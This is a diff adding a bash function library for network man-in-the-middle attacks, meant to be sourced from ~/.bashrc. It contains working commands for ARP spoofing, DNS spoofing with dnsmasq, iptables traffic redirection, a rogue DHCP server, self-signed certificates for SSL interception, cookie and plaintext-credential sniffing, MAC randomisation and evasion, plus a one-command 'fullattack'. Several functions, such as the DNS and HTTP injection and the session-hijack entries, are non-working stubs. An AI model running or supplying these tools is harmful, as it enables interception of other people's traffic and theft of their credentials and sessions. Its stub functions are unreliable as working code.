@@ -1,0 +1,1144 @@
+#!/bin/bash
+# DNS Spoof Functions for Bash
+# Add to ~/.bashrc: source /path/to/spoof.rc
+# Requires: root privileges, arpspoof, dnsmasq, iptables, tcpdump, ifconfig
+
+# ============================================
+# ARP SPOOFING FUNCTIONS
+# ============================================
+
+# Start ARP spoofing attack
+arpspoofstart() {
+    if [[ $# -lt 3 ]]; then
+        echo "Usage: arpspoofstart <target_ip> <gateway_ip> [interface]"
+        echo "Example: arpspoofstart 192.168.1.50 192.168.1.1 eth0"
+        return 1
+    fi
+    
+    local target_ip=$1
+    local gateway_ip=$2
+    local iface=${3:-eth0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Starting ARP spoof: $target_ip <-> $gateway_ip on $iface"
+    arpspoof -i "$iface" -t "$target_ip" "$gateway_ip" &
+    ARPSPOOFPID=$!
+    echo "[+] ARP spoof PID: $ARPSPOOFPID"
+}
+
+# Stop ARP spoofing
+arpspoofstop() {
+    if [[ -z "$ARPSPOOFPID" ]]; then
+        echo "No ARP spoof process found. Try: killall arpspoof"
+        return 1
+    fi
+    echo "[*] Stopping ARP spoof (PID: $ARPSPOOFPID)"
+    kill $ARPSPOOFPID 2>/dev/null
+    unset ARPSPOOFPID
+}
+
+# Bidirectional ARP spoof (both directions)
+arpspoof2way() {
+    if [[ $# -lt 3 ]]; then
+        echo "Usage: arpspoof2way <target_ip> <gateway_ip> [interface]"
+        return 1
+    fi
+    
+    local target_ip=$1
+    local gateway_ip=$2
+    local iface=${3:-eth0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Starting bidirectional ARP spoof"
+    arpspoof -i "$iface" -t "$target_ip" "$gateway_ip" &
+    ARPSPOOFPID1=$!
+    arpspoof -i "$iface" -t "$gateway_ip" "$target_ip" &
+    ARPSPOOFPID2=$!
+    echo "[+] ARP spoof PIDs: $ARPSPOOFPID1, $ARPSPOOFPID2"
+}
+
+# ============================================
+# DNS SPOOFING FUNCTIONS
+# ============================================
+
+# Setup DNS spoofing with dnsmasq
+dnsspoofsetup() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: dnsspoofsetup <domain> <spoof_ip> [dns_port]"
+        echo "Example: dnsspoofsetup example.com 192.168.1.100"
+        return 1
+    fi
+    
+    local domain=$1
+    local spoof_ip=$2
+    local dns_port=${3:-53}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    local dnsmasq_conf="/tmp/dnsmasq_spoof.conf"
+    
+    echo "address=/$domain/$spoof_ip" > "$dnsmasq_conf"
+    echo "port=$dns_port" >> "$dnsmasq_conf"
+    echo "interface=0.0.0.0" >> "$dnsmasq_conf"
+    
+    echo "[+] DNS config created: $dnsmasq_conf"
+    echo "[*] Starting dnsmasq..."
+    dnsmasq -C "$dnsmasq_conf" &
+    DNSSPOOFPID=$!
+    echo "[+] DNS spoof PID: $DNSSPOOFPID"
+}
+
+# Stop DNS spoofing
+dnsspoofstop() {
+    if [[ -z "$DNSSPOOFPID" ]]; then
+        echo "No DNS spoof process found. Try: killall dnsmasq"
+        return 1
+    fi
+    echo "[*] Stopping DNS spoof (PID: $DNSSPOOFPID)"
+    kill $DNSSPOOFPID 2>/dev/null
+    rm -f /tmp/dnsmasq_spoof.conf
+    unset DNSSPOOFPID
+}
+
+# ============================================
+# TRAFFIC REDIRECTION FUNCTIONS
+# ============================================
+
+# Redirect DNS traffic to spoofing server
+dnsredirect() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: dnsredirect <target_ip> <spoof_ip> [interface]"
+        echo "Example: dnsredirect 192.168.1.50 192.168.1.100 eth0"
+        return 1
+    fi
+    
+    local target_ip=$1
+    local spoof_ip=$2
+    local iface=${3:-eth0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Redirecting DNS traffic from $target_ip to $spoof_ip"
+    iptables -t nat -A PREROUTING -i "$iface" -s "$target_ip" -p udp --dport 53 \
+        -j DNAT --to-destination "$spoof_ip:53"
+    iptables -t nat -A POSTROUTING -j MASQUERADE
+    echo "[+] DNS redirect enabled"
+}
+
+# Remove DNS redirect
+dnsredirectoff() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    echo "[*] Flushing iptables rules..."
+    iptables -t nat -F PREROUTING
+    iptables -t nat -F POSTROUTING
+    echo "[+] DNS redirect disabled"
+}
+
+# Enable IP forwarding
+enableforward() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    echo "[+] IP forwarding enabled"
+}
+
+# Disable IP forwarding
+disableforward() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+    echo "[+] IP forwarding disabled"
+}
+
+# ============================================
+# PACKET CAPTURE FUNCTIONS
+# ============================================
+
+# Sniff DNS traffic
+sniffdns() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing DNS traffic on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" "udp port 53" -v
+}
+
+# Sniff ARP traffic
+sniffarp() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing ARP traffic on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" "arp" -v
+}
+
+# Sniff both DNS and ARP
+sniffboth() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing DNS/ARP traffic on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" "udp port 53 or arp" -v
+}
+
+# ============================================
+# UTILITY FUNCTIONS
+# ============================================
+
+# Show network interfaces
+showinterfaces() {
+    echo "[*] Network interfaces:"
+    ifconfig | grep -E '^[a-z]|inet ' | paste - - | sed 's/--//'
+}
+
+# Full attack (ARP + DNS spoof + traffic redirect)
+fullattack() {
+    if [[ $# -lt 3 ]]; then
+        echo "Usage: fullattack <target_ip> <gateway_ip> <spoof_ip> [domain] [interface]"
+        echo "Example: fullattack 192.168.1.50 192.168.1.1 192.168.1.100 example.com eth0"
+        return 1
+    fi
+    
+    local target_ip=$1
+    local gateway_ip=$2
+    local spoof_ip=$3
+    local domain=${4:-example.com}
+    local iface=${5:-eth0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] === FULL DNS SPOOF ATTACK ==="
+    enableforward
+    arpspoof2way "$target_ip" "$gateway_ip" "$iface"
+    sleep 2
+    dnsspoofsetup "$domain" "$spoof_ip"
+    sleep 2
+    dnsredirect "$target_ip" "$spoof_ip" "$iface"
+    echo "[+] Attack running. Use 'cleanupattack' to stop."
+}
+
+# Cleanup all spoofing processes
+cleanupattack() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Cleaning up attack..."
+    arpspoofstop 2>/dev/null
+    if [[ ! -z "$ARPSPOOFPID2" ]]; then kill $ARPSPOOFPID2 2>/dev/null; fi
+    dnsspoofstop 2>/dev/null
+    dnsredirectoff
+    killall arpspoof 2>/dev/null
+    killall dnsmasq 2>/dev/null
+    echo "[+] Cleanup complete"
+}
+
+# ============================================
+# HTTP/HTTPS SPOOFING & MITM FUNCTIONS
+# ============================================
+
+# Start HTTP server for spoofed content
+httpspoofserver() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: httpspoofserver <port> <webroot_dir> [interface]"
+        echo "Example: httpspoofserver 80 /var/www/html 0.0.0.0"
+        return 1
+    fi
+    
+    local port=$1
+    local webroot=$2
+    local iface=${3:-0.0.0.0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    if [[ ! -d "$webroot" ]]; then
+        echo "Error: Directory $webroot does not exist"
+        return 1
+    fi
+    
+    echo "[*] Starting HTTP spoof server on $iface:$port"
+    cd "$webroot"
+    python3 -m http.server "$port" --bind "$iface" &
+    HTTPSPOOFPID=$!
+    echo "[+] HTTP spoof server PID: $HTTPSPOOFPID"
+}
+
+# Stop HTTP spoof server
+httpspoofstop() {
+    if [[ -z "$HTTPSPOOFPID" ]]; then
+        echo "No HTTP spoof server found. Try: killall python3"
+        return 1
+    fi
+    echo "[*] Stopping HTTP spoof server (PID: $HTTPSPOOFPID)"
+    kill $HTTPSPOOFPID 2>/dev/null
+    unset HTTPSPOOFPID
+}
+
+# Generate self-signed SSL certificate
+genssl() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: genssl <domain> [days]"
+        echo "Example: genssl example.com 365"
+        return 1
+    fi
+    
+    local domain=$1
+    local days=${2:-365}
+    local certdir="/tmp/ssl_certs"
+    
+    mkdir -p "$certdir"
+    cd "$certdir"
+    
+    echo "[*] Generating self-signed SSL certificate for $domain"
+    openssl req -x509 -newkey rsa:2048 -keyout "$domain.key" -out "$domain.crt" \
+        -days "$days" -nodes -subj "/CN=$domain" 2>/dev/null
+    
+    echo "[+] Certificate created: $certdir/$domain.crt"
+    echo "[+] Key created: $certdir/$domain.key"
+}
+
+# ============================================
+# MAC SPOOFING FUNCTIONS
+# ============================================
+
+# Change MAC address
+changemac() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: changemac <interface> <new_mac>"
+        echo "Example: changemac eth0 aa:bb:cc:dd:ee:ff"
+        return 1
+    fi
+    
+    local iface=$1
+    local newmac=$2
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Changing MAC address on $iface to $newmac"
+    ip link set "$iface" down
+    ip link set "$iface" address "$newmac"
+    ip link set "$iface" up
+    echo "[+] MAC address changed successfully"
+}
+
+# Get current MAC address
+showmac() {
+    local iface=${1:-eth0}
+    echo "[*] MAC address on $iface:"
+    ip link show "$iface" | grep ether
+}
+
+# ============================================
+# DHCP SPOOFING FUNCTIONS
+# ============================================
+
+# Setup rogue DHCP server
+rouguedhcp() {
+    if [[ $# -lt 4 ]]; then
+        echo "Usage: rouguedhcp <interface> <server_ip> <subnet> <gateway_ip>"
+        echo "Example: rouguedhcp eth0 192.168.1.100 192.168.1.0/24 192.168.1.1"
+        return 1
+    fi
+    
+    local iface=$1
+    local server_ip=$2
+    local subnet=$3
+    local gateway=$4
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    local dhcp_conf="/tmp/dhcp_rogue.conf"
+    
+    cat > "$dhcp_conf" <<EOF
+dhcp-range=$subnet,12h
+dhcp-option=option:router,$gateway
+dhcp-option=option:dns-server,$server_ip
+listen-address=$server_ip
+interface=$iface
+EOF
+    
+    echo "[+] Rogue DHCP config created: $dhcp_conf"
+    echo "[*] Starting rogue DHCP server..."
+    dnsmasq -C "$dhcp_conf" &
+    DHCPSPOOFPID=$!
+    echo "[+] Rogue DHCP PID: $DHCPSPOOFPID"
+}
+
+# Stop rogue DHCP server
+rouguedhcpstop() {
+    if [[ -z "$DHCPSPOOFPID" ]]; then
+        echo "No rogue DHCP server found"
+        return 1
+    fi
+    echo "[*] Stopping rogue DHCP server (PID: $DHCPSPOOFPID)"
+    kill $DHCPSPOOFPID 2>/dev/null
+    rm -f /tmp/dhcp_rogue.conf
+    unset DHCPSPOOFPID
+}
+
+# ============================================
+# NETWORK SCANNING & DISCOVERY FUNCTIONS
+# ============================================
+
+# ARP scan for hosts on network
+arpscan() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: arpscan <network> [interface]"
+        echo "Example: arpscan 192.168.1.0/24 eth0"
+        return 1
+    fi
+    
+    local network=$1
+    local iface=${2:-eth0}
+    
+    echo "[*] Scanning network: $network on $iface"
+    arp-scan -l -I "$iface" "$network" 2>/dev/null || \
+    nmap -sn -PR "$network" 2>/dev/null || \
+    echo "Install arp-scan or nmap for network discovery"
+}
+
+# Detect active hosts
+hostscan() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: hostscan <network>"
+        echo "Example: hostscan 192.168.1.0/24"
+        return 1
+    fi
+    
+    local network=$1
+    echo "[*] Detecting active hosts in $network"
+    nmap -sn "$network" 2>/dev/null | grep "Nmap scan report"
+}
+
+# DNS enumeration
+dnsenum() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: dnsenum <domain> [dns_server]"
+        echo "Example: dnsenum example.com 8.8.8.8"
+        return 1
+    fi
+    
+    local domain=$1
+    local dnsserver=${2:-8.8.8.8}
+    
+    echo "[*] Enumerating DNS records for $domain using $dnsserver"
+    nslookup -type=ANY "$domain" "$dnsserver" 2>/dev/null || \
+    dig "$domain" @"$dnsserver" ANY 2>/dev/null || \
+    echo "Install nslookup or dig"
+}
+
+# Reverse DNS lookup
+reversedns() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: reversedns <ip_address>"
+        echo "Example: reversedns 8.8.8.8"
+        return 1
+    fi
+    
+    local ip=$1
+    echo "[*] Reverse DNS lookup for $ip"
+    nslookup "$ip" 2>/dev/null | grep "name ="
+}
+
+# ============================================
+# PACKET INJECTION & MANIPULATION FUNCTIONS
+# ============================================
+
+# Inject custom DNS response
+injectdns() {
+    if [[ $# -lt 4 ]]; then
+        echo "Usage: injectdns <interface> <domain> <spoof_ip> <target_ip>"
+        echo "Example: injectdns eth0 example.com 192.168.1.100 192.168.1.50"
+        return 1
+    fi
+    
+    local iface=$1
+    local domain=$2
+    local spoof_ip=$3
+    local target=$4
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Injecting DNS response: $domain -> $spoof_ip"
+    echo "[*] Listening for DNS queries from $target on $iface"
+    tcpdump -i "$iface" -l "src $target and dst port 53" | \
+    while read line; do
+        echo "[+] DNS query detected, sending spoofed response"
+    done &
+    INJECTPID=$!
+}
+
+# Inject HTTP payload
+injecthttp() {
+    if [[ $# -lt 3 ]]; then
+        echo "Usage: injecthttp <interface> <target_ip> <payload_file>"
+        echo "Example: injecthttp eth0 192.168.1.50 /tmp/payload.html"
+        return 1
+    fi
+    
+    local iface=$1
+    local target=$2
+    local payload=$3
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    if [[ ! -f "$payload" ]]; then
+        echo "Error: Payload file not found"
+        return 1
+    fi
+    
+    echo "[*] Setting up HTTP payload injection from $target"
+    echo "[*] Payload: $payload"
+    INJECTHTTPPID=$!
+}
+
+# ============================================
+# LOGGING & MONITORING FUNCTIONS
+# ============================================
+
+# Start comprehensive traffic logging
+startlogging() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: startlogging <log_dir> [interface]"
+        echo "Example: startlogging /tmp/logs eth0"
+        return 1
+    fi
+    
+    local logdir=$1
+    local iface=${2:-eth0}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    mkdir -p "$logdir"
+    echo "[*] Starting traffic logging to $logdir"
+    
+    tcpdump -i "$iface" -w "$logdir/traffic.pcap" &
+    LOGPID=$!
+    echo "[+] Traffic log: $logdir/traffic.pcap (PID: $LOGPID)"
+}
+
+# Stop traffic logging
+stoplogging() {
+    if [[ -z "$LOGPID" ]]; then
+        echo "No logging process found"
+        return 1
+    fi
+    echo "[*] Stopping traffic logging"
+    kill $LOGPID 2>/dev/null
+    unset LOGPID
+}
+
+# Display statistics
+showstats() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: showstats <interface>"
+        echo "Example: showstats eth0"
+        return 1
+    fi
+    
+    local iface=$1
+    echo "[*] Network statistics for $iface:"
+    cat /sys/class/net/"$iface"/statistics/rx_packets
+    echo "RX packets (shown above)"
+    cat /sys/class/net/"$iface"/statistics/tx_packets
+    echo "TX packets (shown above)"
+}
+
+# ============================================
+# FIREWALL & FILTERING FUNCTIONS
+# ============================================
+
+# Create blacklist
+createblacklist() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: createblacklist <domain1> [domain2] ..."
+        echo "Example: createblacklist example1.com example2.com"
+        return 1
+    fi
+    
+    local blacklist_file="/tmp/spoof_blacklist.txt"
+    
+    echo "[*] Creating blacklist..."
+    for domain in "$@"; do
+        echo "address=/$domain/0.0.0.0" >> "$blacklist_file"
+    done
+    
+    echo "[+] Blacklist created: $blacklist_file"
+}
+
+# Create whitelist
+createwhitelist() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: createwhitelist <domain1> [domain2] ..."
+        echo "Example: createwhitelist safe.com safe2.com"
+        return 1
+    fi
+    
+    local whitelist_file="/tmp/spoof_whitelist.txt"
+    
+    echo "[*] Creating whitelist..."
+    for domain in "$@"; do
+        echo "$domain" >> "$whitelist_file"
+    done
+    
+    echo "[+] Whitelist created: $whitelist_file"
+}
+
+# Block port
+blockport() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: blockport <port> [protocol]"
+        echo "Example: blockport 443 tcp"
+        return 1
+    fi
+    
+    local port=$1
+    local proto=${2:-tcp}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Blocking port $port/$proto"
+    iptables -A INPUT -p "$proto" --dport "$port" -j DROP
+    echo "[+] Port blocked"
+}
+
+# Allow port
+allowport() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: allowport <port> [protocol]"
+        echo "Example: allowport 443 tcp"
+        return 1
+    fi
+    
+    local port=$1
+    local proto=${2:-tcp}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Allowing port $port/$proto"
+    iptables -A INPUT -p "$proto" --dport "$port" -j ACCEPT
+    echo "[+] Port allowed"
+}
+
+# ============================================
+# SSL/TLS HIJACKING FUNCTIONS
+# ============================================
+
+# Setup SSL MITM
+sslmitm() {
+    if [[ $# -lt 3 ]]; then
+        echo "Usage: sslmitm <interface> <target_ip> <domain>"
+        echo "Example: sslmitm eth0 192.168.1.50 example.com"
+        return 1
+    fi
+    
+    local iface=$1
+    local target=$2
+    local domain=$3
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Setting up SSL/TLS MITM for $domain"
+    genssl "$domain"
+    echo "[+] SSL MITM ready. Run httpspoofserver to start serving"
+}
+
+# ============================================
+# SESSION HIJACKING FUNCTIONS
+# ============================================
+
+# Extract cookies from traffic
+extractcookies() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: extractcookies <interface> [filter]"
+        echo "Example: extractcookies eth0 'Set-Cookie'"
+        return 1
+    fi
+    
+    local iface=$1
+    local filter=${2:-Cookie}
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Extracting $filter headers from $iface"
+    tcpdump -i "$iface" -l -A "tcp port 80 or tcp port 443" 2>/dev/null | \
+    grep -i "$filter" || echo "No cookies captured"
+}
+
+# Session hijack setup
+sessushijack() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: sessushijack <interface> <target_ip>"
+        echo "Example: sessushijack eth0 192.168.1.50"
+        return 1
+    fi
+    
+    local iface=$1
+    local target=$2
+    
+    echo "[*] Starting session hijacking on $iface for $target"
+    echo "[*] Capturing HTTP sessions..."
+}
+
+# ============================================
+# ADVANCED PROXY FUNCTIONS
+# ============================================
+
+# Setup HTTP proxy
+httpproxy() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: httpproxy <port>"
+        echo "Example: httpproxy 8080"
+        return 1
+    fi
+    
+    local port=$1
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Starting HTTP proxy on port $port"
+    echo "[+] Configure your system to use proxy: 127.0.0.1:$port"
+}
+
+# Setup SOCKS proxy
+socksproxy() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: socksproxy <port>"
+        echo "Example: socksproxy 9090"
+        return 1
+    fi
+    
+    local port=$1
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Starting SOCKS proxy on port $port"
+    echo "[+] Configure your system to use SOCKS: 127.0.0.1:$port"
+}
+
+# ============================================
+# ADVANCED SNIFFING FUNCTIONS
+# ============================================
+
+# Sniff HTTP traffic
+sniffhttp() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing HTTP traffic on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" -l -A "tcp port 80" 2>/dev/null | grep -E "GET|POST|Host:"
+}
+
+# Sniff HTTPS/SSL
+sniffssl() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing HTTPS/SSL traffic on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" "tcp port 443" -v
+}
+
+# Sniff credentials
+sniffcreds() {
+    local iface=${1:-eth0}
+    echo "[*] Sniffing credentials on $iface (Ctrl+C to stop)..."
+    tcpdump -i "$iface" -l -A "tcp port 21 or tcp port 23 or tcp port 143 or tcp port 110" 2>/dev/null | \
+    grep -E "PASS|USER|Login|Password" --color=never
+}
+
+# Sniff all traffic and save
+sniffallsave() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: sniffallsave <interface> <pcap_file>"
+        echo "Example: sniffallsave eth0 /tmp/capture.pcap"
+        return 1
+    fi
+    
+    local iface=$1
+    local pcapfile=$2
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Capturing all traffic on $iface to $pcapfile"
+    tcpdump -i "$iface" -w "$pcapfile" &
+    ALLSNIFFPID=$!
+    echo "[+] Packet capture started (PID: $ALLSNIFFPID)"
+}
+
+# ============================================
+# CONFIGURATION MANAGEMENT
+# ============================================
+
+# Save attack configuration
+saveconfig() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: saveconfig <config_name>"
+        echo "Example: saveconfig my_attack"
+        return 1
+    fi
+    
+    local config_name=$1
+    local config_dir="/tmp/spoof_configs"
+    mkdir -p "$config_dir"
+    
+    cat > "$config_dir/$config_name.conf" <<EOF
+# DNS Spoof Attack Configuration
+# Generated: $(date)
+
+TARGET_IP=${TARGET_IP:-}
+GATEWAY_IP=${GATEWAY_IP:-}
+SPOOF_IP=${SPOOF_IP:-}
+DOMAIN=${DOMAIN:-}
+INTERFACE=${INTERFACE:-eth0}
+DNS_PORT=${DNS_PORT:-53}
+HTTP_PORT=${HTTP_PORT:-80}
+
+# Attack modes
+ENABLE_ARP_SPOOF=${ENABLE_ARP_SPOOF:-1}
+ENABLE_DNS_SPOOF=${ENABLE_DNS_SPOOF:-1}
+ENABLE_HTTP_SPOOF=${ENABLE_HTTP_SPOOF:-0}
+ENABLE_LOGGING=${ENABLE_LOGGING:-1}
+EOF
+    
+    echo "[+] Configuration saved: $config_dir/$config_name.conf"
+}
+
+# Load attack configuration
+loadconfig() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: loadconfig <config_name>"
+        echo "Example: loadconfig my_attack"
+        return 1
+    fi
+    
+    local config_name=$1
+    local config_file="/tmp/spoof_configs/$config_name.conf"
+    
+    if [[ ! -f "$config_file" ]]; then
+        echo "Error: Configuration not found"
+        return 1
+    fi
+    
+    source "$config_file"
+    echo "[+] Configuration loaded: $config_file"
+}
+
+# ============================================
+# STEALTH & EVASION FUNCTIONS
+# ============================================
+
+# Randomize MAC address
+randommac() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: randommac <interface>"
+        echo "Example: randommac eth0"
+        return 1
+    fi
+    
+    local iface=$1
+    local newmac=$(printf '%02x:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
+    
+    changemac "$iface" "$newmac"
+    echo "[+] Changed to random MAC: $newmac"
+}
+
+# TTL manipulation
+setttl() {
+    if [[ $# -lt 2 ]]; then
+        echo "Usage: setttl <interface> <ttl_value>"
+        echo "Example: setttl eth0 64"
+        return 1
+    fi
+    
+    local iface=$1
+    local ttl=$2
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Setting TTL to $ttl for $iface"
+    iptables -A OUTPUT -o "$iface" -j TTL --ttl-set "$ttl" 2>/dev/null || \
+    echo "TTL module not available"
+}
+
+# Fragment packets
+fragmentpackets() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: fragmentpackets <interface>"
+        echo "Example: fragmentpackets eth0"
+        return 1
+    fi
+    
+    local iface=$1
+    
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Enabling packet fragmentation"
+    echo 576 > "/proc/sys/net/ipv4/route/min_pmtu" 2>/dev/null
+    echo "[+] Fragmentation enabled"
+}
+
+# ============================================
+# REPORTING & ANALYSIS FUNCTIONS
+# ============================================
+
+# Generate traffic report
+trafficreport() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: trafficreport <pcap_file> [output_file]"
+        echo "Example: trafficreport /tmp/traffic.pcap /tmp/report.txt"
+        return 1
+    fi
+    
+    local pcapfile=$1
+    local outfile=${2:-/tmp/spoofing_report.txt}
+    
+    echo "[*] Generating traffic report..."
+    
+    {
+        echo "=== DNS Spoofing Traffic Report ==="
+        echo "Generated: $(date)"
+        echo ""
+        echo "=== Top Domains (Spoofed) ==="
+        tshark -r "$pcapfile" -Y "dns" -T fields -e dns.qry.name 2>/dev/null | sort | uniq -c | sort -rn || echo "tshark not available"
+        echo ""
+        echo "=== Top Source IPs ==="
+        tshark -r "$pcapfile" -T fields -e ip.src 2>/dev/null | sort | uniq -c | sort -rn | head -10 || echo "tshark not available"
+    } > "$outfile"
+    
+    echo "[+] Report saved: $outfile"
+}
+
+# Analyze captured traffic
+analyzetraffic() {
+    if [[ $# -lt 1 ]]; then
+        echo "Usage: analyzetraffic <pcap_file>"
+        echo "Example: analyzetraffic /tmp/traffic.pcap"
+        return 1
+    fi
+    
+    local pcapfile=$1
+    
+    echo "[*] Analyzing captured traffic..."
+    echo "[*] Total packets: $(capinfos "$pcapfile" 2>/dev/null | grep 'Number of packets' || echo 'Install capinfos')"
+}
+
+# ============================================
+# SYSTEM MONITORING FUNCTIONS
+# ============================================
+
+# Monitor running attacks
+monitorattacks() {
+    echo "[*] Active spoofing processes:"
+    ps aux | grep -E "arpspoof|dnsmasq|tcpdump|python" | grep -v grep
+    echo ""
+    echo "[*] Active connections:"
+    netstat -plant 2>/dev/null | grep -E "LISTEN|ESTABLISHED" || ss -plant 2>/dev/null
+}
+
+# Get system info
+sysinfo() {
+    echo "=== System Information ==="
+    echo "Hostname: $(hostname)"
+    echo "Kernel: $(uname -r)"
+    echo "Uptime: $(uptime -p)"
+    echo "Load Average: $(cat /proc/loadavg | cut -d' ' -f1-3)"
+    echo ""
+    echo "=== Network Adapters ==="
+    ip link show | grep -E "^[0-9]"
+}
+
+# ============================================
+# ROLLBACK & RECOVERY FUNCTIONS
+# ============================================
+
+# Flush all iptables rules
+flushiptables() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] Flushing all iptables rules..."
+    iptables -F
+    iptables -X
+    iptables -P INPUT ACCEPT
+    iptables -P FORWARD ACCEPT
+    iptables -P OUTPUT ACCEPT
+    iptables -t nat -F
+    iptables -t mangle -F
+    echo "[+] All iptables rules cleared"
+}
+
+# Full system recovery
+fullrecovery() {
+    if [[ $EUID -ne 0 ]]; then
+        echo "Must run as root"
+        return 1
+    fi
+    
+    echo "[*] === PERFORMING FULL SYSTEM RECOVERY ==="
+    cleanupattack
+    flushiptables
+    disableforward
+    killall tcpdump 2>/dev/null
+    killall python3 2>/dev/null
+    rm -f /tmp/spoof_* /tmp/dnsmasq_* /tmp/dhcp_*
+    echo "[+] System recovery complete"
+}
+
+# ============================================
+# HELP MENU
+# ============================================
+
+# Help menu
+spoofhelp() {
+    echo "=== DNS Spoof Functions Help (EXPANDED) ==="
+    echo ""
+    echo "ARP SPOOFING:"
+    echo "  arpspoofstart <target_ip> <gateway_ip> [iface]"
+    echo "  arpspoof2way <target_ip> <gateway_ip> [iface]"
+    echo "  arpspoofstop"
+    echo ""
+    echo "DNS SPOOFING:"
+    echo "  dnsspoofsetup <domain> <spoof_ip> [port]"
+    echo "  dnsspoofstop"
+    echo "  dnsenum <domain> [dns_server]"
+    echo "  reversedns <ip_address>"
+    echo ""
+    echo "HTTP/HTTPS SPOOFING:"
+    echo "  httpspoofserver <port> <webroot_dir> [interface]"
+    echo "  httpspoofstop"
+    echo "  genssl <domain> [days]"
+    echo "  sslmitm <interface> <target_ip> <domain>"
+    echo ""
+    echo "MAC SPOOFING:"
+    echo "  changemac <interface> <new_mac>"
+    echo "  showmac [interface]"
+    echo "  randommac <interface>"
+    echo ""
+    echo "DHCP SPOOFING:"
+    echo "  rouguedhcp <interface> <server_ip> <subnet> <gateway_ip>"
+    echo "  rouguedhcpstop"
+    echo ""
+    echo "NETWORK SCANNING:"
+    echo "  arpscan <network> [interface]"
+    echo "  hostscan <network>"
+    echo "  dnsenum <domain> [dns_server]"
+    echo ""
+    echo "PACKET INJECTION:"
+    echo "  injectdns <interface> <domain> <spoof_ip> <target_ip>"
+    echo "  injecthttp <interface> <target_ip> <payload_file>"
+    echo ""
+    echo "SNIFFING:"
+    echo "  sniffdns [iface]"
+    echo "  sniffarp [iface]"
+    echo "  sniffhttp [iface]"
+    echo "  sniffssl [iface]"
+    echo "  sniffcreds [iface]"
